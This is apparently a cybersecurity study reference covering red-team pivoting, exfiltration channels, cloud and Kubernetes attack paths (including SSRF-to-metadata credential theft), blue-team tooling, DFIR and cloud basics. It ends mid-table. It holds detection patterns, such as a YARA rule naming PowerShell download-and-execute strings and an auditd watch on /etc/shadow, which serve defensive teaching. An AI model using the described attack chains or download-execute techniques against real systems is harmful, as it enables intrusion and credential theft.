Blue-team note: PEAS scans touch a huge number of files/registry keys quickly — noisy to EDR. Defense is the fix, not the detect: least privilege, patch, remove SUID, lock down sudo, no creds on disk.
🌉 Pivoting & Tunneling — Chisel, ligolo-ng & proxychains Post-Ex ▶
Reference
Reaching Networks You Can't Route To
A compromised host is often a pivot into segments the operator can't reach directly. Tunneling tools route traffic through the foothold so tools on the attacker box can hit internal systems. Authorized, scoped internal networks only.
ToolRole
ChiselFast TCP/UDP tunnel over HTTP (SOCKS proxy through the pivot)
ligolo-ngModern tunneling with a virtual interface (route to internal subnets)
SSH -D / -LDynamic (SOCKS) & local port forwarding
proxychainsForce any tool through a SOCKS proxy
Blue-team note: internal network segmentation (Zero Trust microseg) is what limits a pivot's reach. Watch for unexpected long-lived tunnels and east-west traffic a host shouldn't originate.
🚪 Data Exfiltration Channels — DNS, ICMP & HTTPS Post-Ex ▶
Reference
How Data Leaves — and How to Catch It
In the final phase, operators demonstrate exfiltration — moving data out past controls. Understanding the channels is squarely a detection skill. Authorized engagements only.
ChannelWhy it's usedDetection
DNS tunnelingDNS is rarely blockedHuge volume/entropy of queries to one domain (Zeek dns.log)
ICMP tunnelingPing is often allowed outOversized/frequent ICMP with payloads
HTTPS to cloudBlends with normal web trafficLarge outbound to new/rare destinations; DLP
Blue-team note: egress filtering (allow-list outbound), DNS monitoring, and DLP are the counters. The theme across R8: modern attackers are quiet and signed — behavioral analytics, not signatures, catch them.
☁️ Pacu — The AWS Exploitation Framework Cloud Offense ▶
Reference
Metasploit, But for AWS
Pacu (Rhino Security Labs) is a modular framework for testing AWS environments — once you have a set of credentials (legitimately, in an authorized assessment), it enumerates permissions, finds privilege-escalation paths, and demonstrates impact. Authorized cloud assessments only.
Module typeDoes
enumMap what the creds can see (IAM, EC2, S3, Lambda)
privescFind IAM misconfig chains (iam:PassRole etc.)
persistence / exfilDemonstrate impact for the report
Blue-team note: everything Pacu does is API calls — CloudTrail + GuardDuty see the enumeration and privesc attempts. This is the offensive mirror of the CSPM tools in the Cloud domain.
🦊 CloudFox & enumerate-iam — Attack-Surface Enumeration Cloud Offense ▶
Reference
"What Can I Do With These Creds?"
After obtaining cloud credentials during an engagement, the first question is what they grant. CloudFox surfaces exploitable attack paths (roles you can assume, secrets you can read, instances you can reach); enumerate-iam brute-forces which API calls a set of keys is allowed to make. Authorized use only.
Blue-team note: these produce a burst of describe/list and access-denied events in CloudTrail — a spike of AccessDenied from one principal is a strong enumeration signal. Least privilege shrinks what any leaked key can enumerate in the first place.
☸️ Kubernetes Attacks — RBAC Abuse & Container Escape Cloud Offense ▶
Reference
From a Pod to the Cluster
A compromised container is the start, not the end. Attackers abuse over-permissive RBAC, over-mounted service-account tokens, and privileged/host configs to escape a pod and take over the node or cluster. kube-hunter (and kubeaudit) probe for these. Authorized clusters only.
WeaknessImpact
Over-broad RBACA pod's token can create pods / read secrets cluster-wide
Privileged / hostPath podEscape to the node's filesystem/kernel
Exposed kubelet / APIDirect command execution on pods
Mounted SA tokenDefault token used to call the API
Blue-team note: this is exactly what the Kubernetes Security card defends — least-privilege RBAC, Pod Security Standards (no privileged/hostPath), network policies, and audit logging.
🎭 Cloud Credential Attacks & the Purple-Team Bridge Cloud Offense ▶
Reference
SSRF → Metadata → Role, and Closing the Loop
The signature cloud breach chain: an app-layer SSRF is used to reach the instance metadata service (IMDS), steal the attached role's temporary credentials, then pivot with those creds. Understanding it is what lets red and blue close the loop together (purple teaming).
StepDefense
SSRF in the appFix the vuln; validate/deny internal URLs
Hit IMDS for credsEnforce IMDSv2 (session-token, blocks basic SSRF)
Use stolen role credsLeast privilege; detect creds used off-instance (GuardDuty)
Purple team: the red team demonstrates the chain against ATT&CK; the blue team confirms each step is detected/blocked (IMDSv2, CSPM, GuardDuty). That collaboration — offense proving, defense hardening — is the whole point of pairing these two domains.
🔵 Blue Team & Defensive Tooling
CySA+ GCIH
NSM · SIEM · EDR · Detection · DFIR · Threat Intel ▾
🦈 Wireshark — Packet Analysis NSM ▶
Reference
See Exactly What's on the Wire
Wireshark is the standard GUI protocol analyzer — capture live traffic or open a .pcap and inspect every packet, field by field. It's how you confirm what actually happened: a failed handshake, plaintext credentials, C2 beaconing, or a malformed exploit. The skill is display filters — cutting millions of packets down to the ten that matter.
▸ DISPLAY FILTERS (not capture filters)
FilterShows
ip.addr == 10.0.0.5Traffic to/from a host
tcp.port == 443A specific port
http.request.method == "POST"HTTP POSTs
tcp.flags.syn == 1 && tcp.flags.ack == 0Bare SYNs (scans)
dns.qry.name contains "evil"Suspicious DNS lookups
tcp.analysis.retransmissionNetwork trouble
Workflow: Statistics → Conversations to find the top talkers, then right-click → Follow → TCP Stream to reassemble a full session into readable text. tshark is the CLI version for scripting/large captures.
📡 tcpdump — Capture from the Command Line NSM ▶
Reference
The Capture Tool That's Already Installed
When there's no GUI — a server, a firewall, a container — tcpdump captures packets from the terminal using BPF (Berkeley Packet Filter) syntax. Grab a capture on the box, then move the .pcap to Wireshark for analysis. Every defender needs this in muscle memory. 
tcpdump -i eth0 -n                 # capture, don't resolve names (-n)
tcpdump -i eth0 -w capture.pcap     # write to file for Wireshark
tcpdump -i eth0 host 10.0.0.5      # one host
tcpdump -i eth0 port 53            # DNS only
tcpdump -i eth0 -A 'tcp port 80'  # print payload as ASCII
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYNs
Tip: always add -n (skip DNS lookups — faster and quieter) and cap size with -c / -C so a capture doesn't fill the disk.
🧬 Zeek — Network Metadata & Logging NSM ▶
Reference
Not Packets — Structured Facts About Connections
Full packet capture is huge and hard to search. Zeek (formerly Bro) instead watches traffic and writes rich, structured logs — one per protocol: conn.log, dns.log, http.log, ssl.log, files.log, notice.log. It turns raw traffic into queryable evidence and is the backbone of many SOCs and Corelight sensors.
LogAnswers
conn.logWho talked to whom, how long, how many bytes
dns.logEvery query & response (catch DGA / tunneling)
ssl.log / x509.logTLS certs & JA3 fingerprints
files.logFiles seen crossing the wire (with hashes)
notice.logZeek's own alerts from its scripts
Zeek's scripting language lets you write custom detections — e.g. flag a host that makes 10,000 DNS queries an hour (tunneling) or long-lived beacons with fixed intervals (C2).
🚨 Suricata & Snort — Signature IDS/IPS NSM ▶
Reference
Rules That Fire on Known-Bad Traffic
Snort (the original) and Suricata (modern, multi-threaded) inspect traffic against signature rules and alert (IDS) or block (IPS) on matches. They ship with community/ET rulesets covering exploits, malware C2, and policy violations. Suricata adds protocol logging and file extraction, overlapping with Zeek.
▸ ANATOMY OF A RULE
alert tcp any any -> $HOME_NET 445 ( \
  msg:"ET EXPLOIT Possible SMB exploit attempt"; \
  flow:to_server,established; \
  content:"|ff|SMB"; \
  sid:2024001; rev:1; )
PartMeaning
actionalert / drop (IPS) / reject
headerproto, src/dst IPs & ports, direction
msg / sidhuman label & unique rule ID
content / flowwhat to match & connection state
Limit: signatures catch known attacks. Novel or encrypted threats slip past — pair with anomaly detection (Zeek) and endpoint telemetry.
🗄️ Arkime & ntopng — Full-Capture & Traffic Analytics NSM ▶
Reference
Searchable History of Everything on the Network
Arkime (formerly Moloch) captures and indexes full packets at scale, giving analysts a searchable web UI to pull the exact session behind an alert — critical for incident response ("show me everything that host did last Tuesday"). ntopng focuses on live traffic analytics — top talkers, flows, bandwidth, and application breakdown in real time.
ToolStrength
ArkimeRetrospective PCAP search & session pivoting at scale
ntopngReal-time flow/bandwidth dashboards & alerting
Together with Zeek (metadata) and Suricata (signatures), full capture completes the classic NSM triad: alerts tell you something happened, metadata gives context, and full packets prove exactly what.
🔍 Splunk — SPL & the SIEM Standard SIEM ▶
Reference
Ask Questions of All Your Logs at Once
A SIEM (Security Information & Event Management) ingests logs from everywhere — firewalls, endpoints, cloud, apps — and lets you search, correlate, and alert across them. Splunk is the market leader; its power is SPL (Search Processing Language), a pipe-based query language.
▸ SPL — PIPE COMMANDS TOGETHER
# Top source IPs for failed logins in the last 24h
index=auth sourcetype=linux_secure "Failed password"
| stats count by src_ip
| sort -count
| head 10

# Detect brute force: 20+ failures from one IP in 5 min
index=auth "Failed password"
| bucket _time span=5m
| stats count by _time, src_ip
| where count > 20
Mental model: search → transform (stats/ eval) → filter (where) → present. Save a search as an alert to run on a schedule and fire on matches. Splunk ES is the security-specific app with prebuilt correlation rules.
🟡 Elastic / ELK Stack — Open-Source Log Analytics SIEM ▶
Reference
Elasticsearch + Logstash + Kibana + Beats
The ELK stack is the dominant open-source logging/SIEM platform. Each piece has a job, and Elastic Security adds SIEM detection rules on top.
ComponentRole
BeatsLightweight shippers on hosts (Filebeat = logs, Winlogbeat = Windows events, Packetbeat = network)
LogstashIngest pipeline — parse, enrich, transform (or use Elastic ingest pipelines)
ElasticsearchThe search/analytics engine that stores & indexes everything
KibanaDashboards, search UI, and the Security/SIEM app
Flow: Beats → Logstash → Elasticsearch → Kibana. The trade vs Splunk: much cheaper (open source) but more ops effort to run and scale the cluster yourself.
🛡️ Wazuh — Open-Source XDR/SIEM SIEM ▶
Reference
Agents + Detection + Compliance, Free
Wazuh is a popular free platform that combines endpoint agents with a SIEM backend (built on the Elastic stack). Agents on each host do log collection, file-integrity monitoring (FIM), rootkit detection, and vulnerability detection; the manager correlates with rules and maps findings to MITRE ATT&CK and compliance frameworks (PCI, CIS).
CapabilityDetail
Log analysisDecoders + rules turn raw logs into alerts
FIMAlerts when watched files change (tampering)
Vuln detectionCorrelates installed software vs CVE feeds
Active responseAuto-actions (block IP, kill process) on triggers
A common home-lab / SMB choice: it delivers endpoint + SIEM + compliance in one free package, where Splunk/commercial XDR would cost heavily.
📥 Graylog & Loki — Log Aggregation Alternatives SIEM ▶
Reference
Two More Ways to Centralize Logs
Graylog is a streamlined, security-friendly log management platform (streams, alerts, dashboards) that's simpler to operate than raw ELK. Loki (from Grafana) takes a different tack: it indexes only labels, not full log content, making it very cheap to store — and it pairs with Grafana so logs sit next to your metrics.
ToolBest for
GraylogTurnkey central log mgmt with security features
LokiCheap, high-volume logs alongside Grafana metrics
The theme across all of these: centralize logs off the hosts. An attacker's first move is deleting local logs — if they're already shipped to a central store, the evidence survives.
📜 Sigma — Write Detections Once, Run Anywhere Detection ▶
Reference
The Vendor-Neutral Detection Format
Every SIEM has its own query language — so a detection written for Splunk doesn't work in Elastic. Sigma solves this: you write a detection once in a simple YAML format, then a converter compiles it into SPL, Elastic KQL, Wazuh rules, etc. It's "the YARA of logs" and how the community shares detections. 
title: Many Failed Logins (Brute Force)
logsource:
  product: linux
  service: auth
detection:
  selection:
    message: 'Failed password'
  condition: selection | count() by src_ip > 20
level: high
Workflow: pull community Sigma rules (or write your own) → convert to your SIEM → deploy. It makes detection engineering portable and reviewable in Git (detection-as-code).
🔬 Sysmon — The Windows Telemetry Powerhouse EDR ▶
Reference
The Logging Windows Should Have Shipped With
Sysmon (Sysinternals) is a free driver that logs rich, high-fidelity endpoint events far beyond default Windows auditing — process creation with command lines and hashes, network connections, file/registry changes, and DLL loads. It's the single highest-value free telemetry source for detecting the attacks in the Red Team domain, feeding your SIEM.
▸ HIGH-VALUE EVENT IDS
IDEvent
1Process creation (cmd line, hashes, parent) — the workhorse
3Network connection (catch C2 beacons)
7Image/DLL loaded (unsigned DLLs, injection)
8CreateRemoteThread (process injection)
10Process access — LSASS access = Mimikatz signal
11File create (dropped payloads)
22DNS query (DGA / tunneling)
Deploy with a curated config (the SwiftOnSecurity / Olaf templates are the community standard) to cut noise. Parent-child process chains (e.g. winword.exe → powershell.exe) are gold for detection.
🦉 OSQuery — Your Fleet as a SQL Database EDR ▶
Reference
Query Endpoints Like a Table
OSQuery (Meta, open source) exposes the OS as SQL tables — processes, users, listening ports, installed packages, startup items — so you can ask questions across your whole fleet with a query. It's cross-platform (Windows/macOS/Linux) and great for both incident response and continuous monitoring. 
-- What's listening on the network?
SELECT p.name, l.port, l.address
FROM listening_ports l JOIN processes p ON l.pid = p.pid;

-- Unsigned processes running from temp dirs
SELECT name, path FROM processes
WHERE path LIKE '%\Temp\%';
Run ad-hoc during IR, or schedule "packs" of queries that stream diffs to your SIEM (via Fleet/Kolide) for continuous detection — e.g. alert whenever a new persistence entry appears.
🦖 Velociraptor — Endpoint DFIR & Hunting at Scale DFIR ▶
Reference
Hunt Across Thousands of Machines
Velociraptor is a powerful open-source DFIR and threat-hunting platform. Using its query language VQL, you can collect artifacts, run hunts, and monitor endpoints across an entire estate from one console — "check every machine for this IOC" returns answers in minutes, not days.
UseDetail
HuntsRun an artifact collection across all endpoints at once
ArtifactsReusable collectors (prefetch, browser history, registry, memory)
Client monitoringContinuous event queries (like a lightweight EDR)
VQLSQL-like language to query live endpoint state
It's become a go-to for IR teams who need broad, fast visibility without a six-figure commercial EDR — especially during active incidents.
🪟 Windows Event Logs — The IDs That Matter EDR ▶
Reference
Native Telemetry Every Analyst Must Know
Before Sysmon, there's the built-in Security log. Knowing the key event IDs lets you reconstruct logons, privilege use, and lateral movement — these show up constantly in SOC interviews and real investigations.
IDMeaning
4624 / 4625Successful / failed logon (watch logon type — 3=network, 10=RDP)
4688Process creation (enable cmd-line auditing!)
4672Special privileges assigned (admin logon)
4720 / 4728User created / added to a privileged group
4769Kerberos service ticket — spikes = Kerberoasting
4662Directory-object access — from a non-DC can mean DCSync
7045Service installed — classic psexec / persistence
1102Audit log cleared — attackers covering tracks
🐧 auditd & Linux Endpoint Logging EDR ▶
Reference
The Same Visibility, on Linux
auditd is the Linux audit framework — it logs syscalls, file access, and command execution against rules you define. Pair it with the Linux kernel's audit subsystem (or a modern eBPF agent like Falco) to get process-level telemetry equivalent to Sysmon on Windows. 
# Watch a sensitive file for any access
auditctl -w /etc/shadow -p rwa -k shadow-access

# Log every execve (process execution)
auditctl -a always,exit -F arch=b64 -S execve -k exec

ausearch -k shadow-access        # query by key
Ship these logs to the SIEM alongside Windows/Sysmon so hunts and detections cover the whole estate. For richer, lower-overhead visibility, eBPF-based tools (Falco, Tetragon) are the modern complement — see the eBPF topic in Linux.
🧾 YARA — Pattern-Matching Rules for Malware Detection ▶
Reference
"The Pattern-Matching Swiss Knife for Malware"
YARA lets analysts describe malware families by textual/binary patterns and match files, memory, or processes against them. It's how threat researchers share detections for a specific implant or campaign — and it runs in scanners, EDRs, and IR tools alike. 
rule Suspicious_PowerShell_Downloader {
  strings:
    $a = "DownloadString" nocase
    $b = "IEX" nocase
    $c = "FromBase64String" nocase
  condition:
    2 of them          // any 2 of the strings present
}
Use: hunt across a fleet ("scan every host for this rule" via Velociraptor/OSQuery), triage a sample, or scan process memory for an unpacked payload. Pair with yara-x (the modern engine) and community rulesets. Focus rules on behavior/capabilities, not just hashes, so they survive repacking.
🎯 MITRE ATT&CK & Navigator — Coverage-Driven Detection Detection ▶
Reference
A Shared Map of How Attackers Operate
ATT&CK is a knowledge base of real adversary tactics (the "why" — e.g. Persistence, Lateral Movement) and techniques (the "how" — e.g. T1053 Scheduled Task). It gives defenders a common language and a way to measure detection coverage rather than collecting disconnected alerts.
ConceptDetail
TacticThe adversary's goal for a step (14 columns)
Technique / Sub-techniqueThe specific method (Txxxx)
NavigatorHeat-map tool to mark what you can detect/prevent
The workflow: map each detection you have to a technique, color the Navigator, and the gaps become your detection backlog. Prioritize techniques your actual threat actors use (tie to threat intel). Every good detection references its ATT&CK ID.
⚛️ Adversary Emulation — Atomic Red Team & Caldera Detection ▶
Reference
Test Whether Your Detections Actually Fire
A detection you've never triggered is a hope, not a control. Atomic Red Team is a library of small, precise tests — one per ATT&CK technique — you run to see if your telemetry and alerts catch it. Caldera (MITRE) automates full, chained adversary emulations. This is the safe, authorized way to validate the blue team.
ToolDoes
Atomic Red TeamPer-technique "atomic" tests (run T1053, check the alert fired)
CalderaAutomated, chained emulation of full adversary behavior
Purple teamRed runs the test, blue tunes the detection, together
Run these in a lab or with authorization. The loop — emulate → observe → tune → re-test — is how you turn ATT&CK coverage from theoretical to proven.
🎚️ Detection Tuning & the Pyramid of Pain Detection ▶
Concept
Make Detections Hurt the Attacker, Not the Analyst
The Pyramid of Pain ranks indicators by how much it costs an adversary to change them. Detecting a file hash is trivial to evade (recompile); detecting their TTPs (behaviors) forces them to relearn how they operate. Aim your detections up the pyramid.
IndicatorAttacker cost to change
Hash valuesTrivial
IP addressesEasy
Domain namesSimple
Network/host artifactsAnnoying
ToolsChallenging
TTPs (behaviors)Tough — forces a rethink
Tuning: the other half is fighting false positives — a noisy rule everyone mutes is worse than no rule. Track each detection's true/false-positive rate, add context/allowlists, and require every alert to be actionable. Detection-as-code (Sigma in Git, tested with Atomic) keeps quality high.
🧠 Volatility — Memory Forensics DFIR ▶
Reference
RAM Holds What Disk Never Sees
Malware runs in memory — decrypted payloads, injected code, live network connections, and cached credentials that never touch disk. Volatility (v3) analyzes a RAM capture to reconstruct exactly what a machine was doing at the moment of capture. It's the cornerstone of incident response. 
vol -f mem.raw windows.pslist        # running processes
vol -f mem.raw windows.pstree        # parent/child tree (spot odd chains)
vol -f mem.raw windows.netscan       # network connections (C2)
vol -f mem.raw windows.malfind       # injected/hidden code
vol -f mem.raw windows.cmdline       # process command lines
Workflow: pslist/pstree to spot anomalies → malfind for injection → netscan for C2 → dump the suspect process for deeper analysis. Capture memory before pulling the plug — it's volatile (order-of-volatility rule).
💽 Autopsy & The Sleuth Kit — Disk Forensics DFIR ▶
Reference
Investigate a Disk Image, File by File
The Sleuth Kit (TSK) is the CLI engine; Autopsy is its GUI. Together they analyze a forensic disk image — recovering deleted files, building timelines, carving artifacts, and hashing everything — without altering the original evidence.
CapabilityDetail
Deleted-file recoveryRecover files still in unallocated space
File carvingRebuild files from raw bytes by signature
TimelineMAC times (modified/accessed/created) across the FS
Keyword & hash searchFind IOCs; flag known-bad by hash
Always work on a write-blocked copy and verify the image hash matches the original — evidence integrity is everything.
⏱️ KAPE & plaso — Triage & Super-Timelines DFIR ▶
Reference
Fast Collection, Then a Unified Timeline
Full disk imaging is slow; often you need answers now. KAPE rapidly collects just the high-value forensic artifacts (registry, event logs, prefetch, browser history) from a live or imaged system. plaso/log2timeline then merges everything into one chronological super-timeline — the single most useful artifact in an investigation.
ToolRole
KAPETargeted artifact collection + modules to parse them
plaso (log2timeline)Combine all timestamped artifacts into one timeline
Timeline ExplorerFilter/pivot the resulting mega-CSV
The timeline answers the core IR question: what happened, in what order? — from initial access to persistence to exfil.
🗂️ Windows Forensic Artifacts DFIR ▶
Reference
Where Windows Records "This Ran"
Windows silently records evidence of execution and access all over the OS. Knowing these artifacts is what lets an examiner prove a program ran even when the attacker deleted it.
ArtifactProves
PrefetchA program executed (and when/how often)
ShimCache / AmCacheProgram presence/execution (even if deleted)
$MFT / $J (USN journal)File creation/deletion/rename history
Registry (Run keys, Services)Persistence mechanisms
SRUMApp resource/network usage over time
Jump Lists / LNK / ShellbagsFiles & folders a user opened
⚖️ Chain of Custody & Evidence Handling DFIR ▶
Procedure
Evidence That Holds Up in Court
If findings might lead to legal action, how you handle evidence matters as much as what you find. Mishandled evidence is inadmissible — the process is as important as the tools.
PrincipleDetail
Order of volatilityCollect most-volatile first: RAM → network state → disk → archives
Write-blockingNever alter the original; image it, work on copies
HashingHash on acquisition & verify — proves the evidence is unchanged
Chain of custody logWho had it, when, why — an unbroken documented trail
DocumentationRecord every action; reproducibility = credibility
🔗 MISP & OpenCTI — Threat-Intel Platforms Threat Intel ▶
Reference
Organize and Share What You Know About Adversaries
Threat intelligence is only useful if it's structured and actionable. MISP is the widely-used open platform for storing and sharing indicators (IOCs) and events between organizations/ISACs. OpenCTI models the bigger picture — linking actors, campaigns, malware, and TTPs into a queryable knowledge graph.
PlatformStrength
MISPIOC storage + community sharing + feeds; export to your SIEM
OpenCTIStructured CTI knowledge graph (actors↔TTPs↔malware)
The payoff: pull a feed of known-bad indicators into detection, and enrich alerts ("this IP belongs to APT-X's infrastructure") so responders act with context, not guesswork.
📦 STIX & TAXII — The Sharing Standards Threat Intel ▶
Reference
A Common Language for Threat Data
For orgs to share intel, they need a shared format and transport. STIX is the standardized language for describing threats (indicators, actors, TTPs) as structured JSON; TAXII is the protocol for exchanging STIX data between systems. Together they let MISP, commercial feeds, and government sources interoperate.
StandardRole
STIXThe data model — what a threat object looks like
TAXIIThe transport — how feeds are served & pulled
Think of it like the Sigma/YARA idea applied to intel: a portable format so a detection or indicator written once can be consumed anywhere.
🧫 Malware Sandboxes — VirusTotal, Any.Run & Hybrid Analysis Threat Intel ▶
Reference
Detonate the Sample, Watch What It Does
When you have a suspicious file, a sandbox runs it in an instrumented VM and reports its behavior — files dropped, registry changes, network callbacks — without risking a real host. VirusTotal aggregates dozens of AV verdicts + community intel; Any.Run gives an interactive live detonation; Hybrid Analysis produces deep behavioral reports.
OPSEC caution: uploading a sample to a public sandbox makes it (and any secrets in it) public — attackers monitor VT for their own samples. For sensitive incidents, use a private/on-prem sandbox (Cuckoo, CAPE) instead of a public service.
🧭 Threat Hunting — Assume Breach, Go Looking Threat Intel ▶
Concept
Proactively Finding What Alerts Missed
Detection waits for a rule to fire; threat hunting proactively searches the environment on a hypothesis that something slipped through. It assumes breach and asks "if an attacker were here, what would I see?" — turning findings into new automated detections.
StepDetail
Hypothesis"An attacker would use scheduled tasks for persistence"
HuntQuery telemetry (Sysmon/EDR/SIEM) for that behavior
InvestigateTriage anomalies — benign or malicious?
OperationalizeTurn a real finding into a standing detection
Good hunts are driven by ATT&CK (hunt technique by technique) and threat intel (hunt for your actors' TTPs). Every hunt either finds evil or finds a detection gap — both are wins.
🩺 Vulnerability Scanners — Nessus & OpenVAS Vuln Mgmt ▶
Reference
Find the Holes Before Attackers Do
Authenticated and unauthenticated scanners enumerate hosts, fingerprint services, and match them against a vulnerability database (CVE/plugin feeds). They are the engine behind the vulnerability management lifecycle — discover, prioritize, remediate, verify.
ToolNotes
Nessus (Tenable)Industry-standard commercial scanner; huge plugin library
OpenVAS / GreenboneOpen-source alternative (GVM); free NVT feed
Qualys / Rapid7 InsightVMCloud-delivered VM platforms with agents
Key idea: authenticated scans (with creds) see missing patches and config far better than network-only scans. Feed findings into CVSS + exploitability (EPSS/KEV) to prioritize — patch what's actually being exploited first, not just the highest CVSS.
📏 CIS Benchmarks & CIS-CAT — Hardening Baselines Hardening ▶
Reference
Consensus Config for Everything
The CIS Benchmarks are free, consensus-built hardening guides for OSes, cloud, containers, and apps — hundreds of specific settings ("disable root SSH", "set password age"). CIS-CAT audits a system against a benchmark and scores compliance.
ConceptDetail
Levels 1 & 2L1 = safe baseline; L2 = defense-in-depth (may break things)
BenchmarksOS, K8s, Docker, AWS/Azure/GCP, browsers, databases
CIS ControlsThe companion 18 prioritized safeguards (IG1–IG3)
CIS Hardened Images (pre-baked AMIs/VMs) let you start compliant. Benchmarks pair naturally with policy-as-code — encode the controls once, enforce them everywhere.
🐧 Lynis — Linux Audit & Hardening Hardening ▶
Reference
A One-Command Health Check for a Host
Lynis is an agentless shell-script auditor for Linux/Unix/macOS. Run it on a host and it walks hundreds of checks — kernel params, file permissions, services, SSH config, firewall — then prints a hardening index and prioritized suggestions. 
# Audit the local system
sudo lynis audit system

# Key output: warnings, suggestions, and a Hardening index (0-100)
# Reports land in /var/log/lynis.log & lynis-report.dat
Great for a fast baseline and for teaching why each setting matters (each suggestion links to guidance). Complements — doesn't replace — a real benchmark like CIS.
🛡️ OpenSCAP & DISA STIGs — Compliance-Driven Hardening Compliance ▶
Reference
Machine-Readable Security Policy
SCAP (Security Content Automation Protocol) is a set of standards (OVAL, XCCDF, CCE) for expressing security policy as machine-readable content. OpenSCAP scans and even auto-remediates against that content; DISA STIGs are the U.S. DoD's hardening standards distributed in this format. 
# Scan RHEL against a STIG profile and generate an HTML report
oscap xccdf eval \
  --profile xccdf_org.ssgproject.content_profile_stig \
  --report report.html \
  /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
SSG (SCAP Security Guide) ships ready profiles — STIG, CIS, PCI-DSS, HIPAA. This is how regulated environments prove and enforce a baseline continuously rather than via a one-time checklist.
🩹 Patch & Config Management as a Control Vuln Mgmt ▶
Concept
Finding Vulns Is Easy — Fixing at Scale Is Hard
A scanner produces a list; the real work is closing the loop across thousands of systems reliably. Patch and configuration management turn remediation from a manual scramble into a repeatable, measurable control.
ToolRole
WSUS / SCCM / IntuneWindows patch orchestration & compliance
Ansible / SaltCross-platform patching & config enforcement (ties to F4)
unattended-upgrades / dnf-automaticOS-native auto-patching for Linux
Metrics that matter: patch coverage %, mean time to remediate (MTTR) by severity, and drift (systems that fell out of compliance). Config management also prevents drift — the box stays hardened, not just gets hardened once.
🍯 Honeypots & Canarytokens — Deception Tech Deception ▶
Concept
Traps That Only an Intruder Trips
A legitimate user never touches a fake admin account, a decoy database, or a file named passwords.xlsx planted on a share. Deception assets have near-zero false positives — any interaction is, by definition, suspicious.
TypeDetail
HoneypotA fake system that logs everything an attacker does (T-Pot, Cowrie)
Honeytoken / CanarytokenA fake credential, AWS key, or URL that alerts when used
Honey accountA dormant AD account — any auth attempt is an alert
Deception gridDecoys scattered through the network to catch lateral movement
Best value: place canarytokens inside the network where only a snooping attacker would find them. A tripped token is high-fidelity evidence of a breach in progress — the mirror image of the red-team exfil/pivot cards.
📧 Email Security — SPF, DKIM & DMARC Email Defense ▶
Reference
Stopping Spoofed Mail at the Door
Email is the #1 initial-access vector, and by default anyone can forge your domain in the "From" field. Three DNS-based standards, layered, let receivers verify that mail really came from you — and tell them what to do when it didn't.
RecordAnswers
SPF"Which servers may send mail for this domain?" (IP allow-list in DNS)
DKIM"Was this message signed by the domain & unmodified?" (crypto signature)
DMARC"If SPF/DKIM fail, what do I do — and where do I report?" (policy + alignment)
# A DMARC record that quarantines fakes and sends reports
_dmarc.example.com  TXT  "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; adkim=s; aspf=s"
Progress p=none (monitor) → quarantine → reject as you gain confidence. Add sandboxing, link rewriting, and external-sender banners for the phishing that still gets through.
🪪 Identity Threat Detection & Response (ITDR) Identity ▶
Concept
"Identity Is the New Perimeter"
Modern attackers don't break in, they log in — with phished, sprayed, or stolen credentials and session tokens. ITDR watches the identity provider (Entra ID, Okta, AD) for the behavioral signals of account takeover.
SignalWhat it suggests
Impossible travelLogins from two distant locations too close in time
MFA fatigue / bombingRepeated push prompts hoping the user taps "approve"
Token / session theftA valid session used from a new device/IP (AiTM phishing)
Password sprayOne password tried across many accounts
Controls: phishing-resistant MFA (FIDO2/passkeys), Conditional Access (device + risk based), and continuous access evaluation that can kill a session mid-flight. This is the defensive answer to the credential-attack and AD cards on the red-team side.
🤝 Purple Teaming — Closing the Detection Gap Purple ▶
Concept
Red + Blue in the Same Room
Instead of red team "winning" and blue team "losing," a purple team exercise runs attacks collaboratively: red executes a known technique, blue checks whether it was logged, alerted, and actionable — and they fix the gap on the spot.
StepDetail
Pick an ATT&CK techniquee.g. T1003 credential dumping
Red emulates itAtomic Red Team / Caldera runs the procedure (ties to B4)
Blue verifiesWas it in the logs? Did an alert fire? Was it triaged?
ImproveAdd telemetry, write/tune the detection, re-test
The output is measurable detection coverage mapped to ATT&CK — you learn exactly which techniques you'd catch and which you'd miss. This card is the keystone that ties the whole Red and Blue domains together.
☁️ Cloud Platforms — AWS · GCP · Azure
AWS GCP
AWS · GCP · IAM · Networking · Compute · Storage · Security ▾
🌩️ Cloud Fundamentals — Regions, AZs & Shared Responsibility Foundations ▶
Concept
The Mental Model Before the Buttons
Cloud providers rent computing on demand. You should hold three ideas before touching a console: the service models (how much you manage), the global infrastructure (where your stuff physically runs), and the shared responsibility model (who secures what).
▸ SERVICE MODELS
ModelYou ManageExample
IaaSOS + runtime + appEC2, Compute Engine
PaaSJust your appApp Engine, Elastic Beanstalk
SaaSNothing — just use itGmail, Workspace
▸ GLOBAL LAYOUT
TermMeaning
RegionA geographic area (us-east-1, europe-west1). Pick for latency, law, cost.
Availability ZoneIsolated datacenter(s) in a region. Deploy across ≥2 AZs for HA.
Edge / PoPCDN locations near users (CloudFront, Cloud CDN).
Shared responsibility: the provider secures the cloud itself (hardware, hypervisor, physical); you secure what you put in it — IAM, data, patching your VMs, network config. Most breaches are the customer's side (a public bucket, a wildcard IAM policy), not the provider's.
🟧 AWS — Getting Started AWS ▶
How-To
Account, Identity & First Steps
Amazon Web Services is the largest cloud, with 200+ services. The first thing to get right is identity — mistakes here cause most incidents and surprise bills.
▸ DAY-ONE CHECKLIST
DoWhy
Stop using the root accountCreate an admin IAM user/role; lock root with MFA and don't use it daily.
Enable MFA everywhereThe single biggest account-takeover defense.
Set a billing alarmBudgets → alert at $X so a runaway resource doesn't run for weeks.
Pick a home regionEverything is regional; resources in us-east-1 aren't visible in eu-west-1.
Learn the Free Tiert2/t3.micro, 5 GB S3, etc. — practice without cost.
Three ways to drive AWS: the Console (web, learn here), the CLI (scripting/repeatability), and SDKs/IaC (Terraform, CloudFormation) for production. Graduate from console → CLI → IaC as you go.
⌨️ AWS CLI & CloudShell AWS ▶
How-To
Driving AWS From the Terminal
aws configure                     # set key, secret, region, output format
aws configure --profile work       # named profile for a second account
aws sts get-caller-identity        # "who am I?" — confirm creds/role

aws ec2 describe-instances         # list VMs (JSON)
aws s3 ls                          # list buckets
aws s3 cp file.txt s3://my-bucket/  # upload

# JMESPath --query trims the noise; --output table for humans
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,State.Name]' \
  --output table
CloudShell is a browser terminal with the CLI pre-authenticated as your console identity — nothing to install. Prefer IAM roles over long-lived access keys; on an EC2 instance the CLI picks up an attached role automatically (no keys on disk).
🟦 Google Cloud — Getting Started GCP ▶
How-To
The Resource Hierarchy Is Everything
GCP's defining concept is its resource hierarchy — understand it and the rest falls into place. Policies (IAM, budgets) set high up are inherited downward.
▸ HIERARCHY (top → bottom)
LevelPurpose
